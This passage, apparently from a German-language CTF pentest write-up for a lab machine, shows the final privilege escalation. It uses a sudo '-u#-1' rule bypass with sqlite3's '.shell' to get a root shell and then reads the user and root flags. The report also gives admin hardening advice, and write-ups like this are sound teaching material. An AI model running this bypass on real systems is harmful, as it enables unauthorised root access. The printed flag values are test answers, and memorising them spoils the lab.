+             <p class="evaluation">**Bewertung:** Dies ist eine interessante, aber trickreiche `sudo`-Regel. Obwohl der direkte Weg zu Root blockiert ist, deutet die Möglichkeit, `sqlite3` als *jeden anderen* Benutzer auszuführen, auf einen möglichen Exploit hin. Die Ressource GTFOBins listet oft Wege auf, wie solche Konfigurationen umgangen werden können.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** GTFOBins oder Exploit-DB nach `sudo sqlite3 !root` durchsuchen. Die dort beschriebenen Techniken ausprobieren. Oft nutzen solche Exploits negative User-IDs (wie `-1`), die vom System als `root` interpretiert werden, aber von der `sudo`-Regel (`!root`) nicht erfasst werden.
+             **Empfehlung (Admin):** `sudo`-Regeln äußerst präzise formulieren. Die `!root`-Einschränkung ist oft ein Versuch, etwas zu erlauben, ohne Root-Rechte zu geben, kann aber oft umgangen werden. Es ist meist sicherer, explizit die erlaubten Benutzer/Gruppen aufzulisten, anstatt `ALL` mit Ausnahmen zu verwenden.</p>
+
+             <p class="comment">Wir wenden eine bekannte Technik an, um die `!root`-Einschränkung bei `sudo` zu umgehen, indem wir die User-ID `-1` verwenden, die oft als `root` interpretiert wird.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">frank@devguru:~/gitea-repositories/frank/benattack.git$ <span class="command">sudo -u#-1 /usr/bin/sqlite3 /dev/null '.shell /bin/sh'</span></div>
+                    <div class="prompt"># <span class="command">id</span></div>
+                    <pre>
+<span class="command">uid=0(root)</span> gid=1000(frank) groups=1000(frank)
+                    </pre>
+                     <div class="prompt"># <span class="command"># Root-Shell erhalten!</span></div>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Wir führen den `sudo`-Befehl wie folgt aus:
+            *   `sudo -u#-1`: Wir weisen `sudo` an, den Befehl als Benutzer mit der ID `-1` auszuführen. Die Raute (`#`) ist eine alternative Schreibweise für die User-ID. Viele Systeme interpretieren die User-ID `-1` als `root` (UID 0). Da die `sudo`-Regel `!root` explizit den Namen `root` verbietet, aber nicht die UID `-1`, umgeht dieser Trick die Einschränkung.
+            *   `/usr/bin/sqlite3 /dev/null`: Wir starten `sqlite3` und öffnen eine temporäre In-Memory-Datenbank (`/dev/null` wird hier oft als Platzhalter verwendet).
+            *   `'.shell /bin/sh'`: Wir übergeben `sqlite3` einen internen Befehl. Der `.shell`-Befehl führt einen externen Shell-Befehl aus. Hier starten wir `/bin/sh`.
+            Da `sqlite3` mit der effektiven UID 0 (wegen `-u#-1`) läuft, wird auch die gestartete `/bin/sh` mit Root-Rechten ausgeführt. Der `id`-Befehl bestätigt, dass wir `uid=0(root)` haben.</p>
+            <p class="evaluation">**Bewertung:** Fantastisch! Die Privilege Escalation von `frank` zu `root` war erfolgreich durch die clevere Umgehung der `!root`-Beschränkung in der `sudo`-Regel für `sqlite3`.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Root-Shell ist erreicht. Flags lesen, Bericht abschließen.
+            **Empfehlung (Admin):** **Sofort die `sudo`-Regel für `sqlite3` entfernen oder korrigieren!** Niemals `ALL` mit `!root`-Ausnahmen verwenden, wenn es um potenziell gefährliche Binaries geht. Sicherere Alternative wäre, `sqlite3` nur für einen spezifischen, unprivilegierten Benutzer zu erlauben, falls absolut notwendig.</p>
+
+             <p class="comment">Wir lesen die Root- und User-Flags aus der erhaltenen Root-Shell.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">cat /root/root.txt</span></div>
+                    <pre>
+<span class="password">96440606fb88aa7497cde5a8e68daf8f</span>
+                    </pre>
+                     <div class="prompt"># <span class="command">ls /home</span></div>
+                    <pre>
+<span class="command">frank</span>
+                    </pre>
+                     <div class="prompt"># <span class="command">cat /home/frank/user.txt</span></div>
+                    <pre>
+<span class="password">22854d0aec6ba776f9d35bf7b0e00217</span>
+                    </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Als Root lesen wir erfolgreich die Datei `/root/root.txt` und zur Bestätigung auch `/home/frank/user.txt`.</p>
+             <p class="evaluation">**Bewertung:** Beide Flags wurden erfolgreich erlangt. Der Penetrationstest ist abgeschlossen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Ergebnisse dokumentieren und Bericht fertigstellen.
+             **Empfehlung (Admin):** Alle identifizierten Schwachstellen (exponiertes `.git`, `adminer.php`, Klartext-Passwörter in Configs, unsichere CMS-Template-Bearbeitung, Gitea-Datenbank-Passwort in Backup, Gitea Git Hooks, unsichere `sudo`-Regel für `sqlite3`) dringend beheben.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/frank/user.txt</div>
+                    <div class="flag-value"><span class="password">22854d0aec6ba776f9d35bf7b0e00217</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">96440606fb88aa7497cde5a8e68daf8f</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 11. November 2022</p> <!-- Datum aus Nmap-Scan extrahiert -->
+    </footer>
+</body>
+</html>
